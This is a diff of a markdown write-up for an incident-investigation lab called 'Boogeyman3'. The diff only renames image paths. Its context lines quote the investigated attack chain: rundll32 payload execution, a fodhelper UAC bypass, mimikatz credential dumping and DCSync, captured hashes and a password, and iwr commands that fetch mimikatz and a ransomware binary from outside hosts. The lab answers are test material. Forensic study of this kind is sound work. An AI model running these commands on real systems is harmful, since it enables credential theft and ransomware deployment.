@@ -65,7 +65,7 @@ The `.hta` extension was hidden by Windows default settings, making it visually 
 ```
 6392
 ```
-![Answer](../images/Boogeyman3-1.png)
+![Answer](../imgs/Boogeyman3-1.png)
 
 ---
 
@@ -82,7 +82,7 @@ Once `mshta.exe` was active, it spawned `xcopy.exe` to copy the hidden DLL paylo
 ```
 "C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
 ```
-![Answer](../images/Boogeyman3-2.png)
+![Answer](../imgs/Boogeyman3-2.png)
 
 ---
 
@@ -95,7 +95,7 @@ After copying, `mshta.exe` executed the payload via `rundll32.exe` — a living-
 ```
 "C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
 ```
-![Answer](../images/Boogeyman3-3.png)
+![Answer](../imgs/Boogeyman3-3.png)
 
 ---
 
@@ -115,7 +115,7 @@ Register-ScheduledTask Review -InputObject $D -Force
 ```
 Review
 ```
-![Answer](../images/Boogeyman3-4.png)
+![Answer](../imgs/Boogeyman3-4.png)
 
 ---
 
@@ -128,7 +128,7 @@ Following execution of the payload, an active outbound HTTP beaconing session wa
 ```
 165.232.170.151:80
 ```
-![Answer](../images/Boogeyman3-5.png)
+![Answer](../imgs/Boogeyman3-5.png)
 
 ---
 
@@ -145,7 +145,7 @@ The attacker confirmed local admin access via `whoami /groups`, then abused `fod
 ```
 fodhelper.exe
 ```
-![Answer](../images/Boogeyman3-6.png)
+![Answer](../imgs/Boogeyman3-6.png)
 
 ---
 
@@ -162,7 +162,7 @@ iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimi
 ```
 https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
 ```
-![Answer](../images/Boogeyman3-7.png)
+![Answer](../imgs/Boogeyman3-7.png)
 
 ---
 
@@ -179,7 +179,7 @@ sekurlsa::logonpasswords
 ```
 itadmin:F84769D250EB95EB2D7D8B4A1C5613F2
 ```
-![Answer](../images/Boogeyman3-8.png)
+![Answer](../imgs/Boogeyman3-8.png)
 
 ---
 
@@ -210,7 +210,7 @@ The share `\\WKSTN-1327.quicklogistics.org\ITFiles\` was discovered and accessed
 ```
 IT_Automation.ps1
 ```
-![Answer](../images/Boogeyman3-9.png)
+![Answer](../imgs/Boogeyman3-9.png)
 
 ---
 
@@ -223,7 +223,7 @@ The `IT_Automation.ps1` script contained **hardcoded cleartext credentials** —
 ```
 QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987
 ```
-![Answer](../images/Boogeyman3-10.png)
+![Answer](../imgs/Boogeyman3-10.png)
 
 ---
 
@@ -234,7 +234,7 @@ QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987
 ```
 WKSTN-1327
 ```
-![Answer](../images/Boogeyman3-11.png)
+![Answer](../imgs/Boogeyman3-11.png)
 
 ---
 
@@ -258,7 +258,7 @@ On the target machine, all commands spawned under the WinRM service host process
 ```
 wsmprovhost.exe
 ```
-![Answer](../images/Boogeyman3-12.png)
+![Answer](../imgs/Boogeyman3-12.png)
 
 ---
 
@@ -271,7 +271,7 @@ Mimikatz was re-executed on `WKSTN-1327` to dump the local Domain Admin credenti
 ```
 administrator:00f80f2538dcb54e7adc715c0e7091ec
 ```
-![Answer](../images/Boogeyman3-13.png)
+![Answer](../imgs/Boogeyman3-13.png)
 
 ---
 
@@ -288,7 +288,7 @@ lsadump::dcsync /domain:quicklogistics.org /user:backupda
 ```
 backupda
 ```
-![Answer](../images/Boogeyman3-14.png)
+![Answer](../imgs/Boogeyman3-14.png)
 
 ---
 
@@ -309,7 +309,7 @@ iwr http://ff.sillytechninja.io/ransomboogey.exe -OutFile update.exe
 ```
 http://ff.sillytechninja.io/ransomboogey.exe
 ```
-![Answer](../images/Boogeyman3-15.png)
+![Answer](../imgs/Boogeyman3-15.png)
 
 ---
 
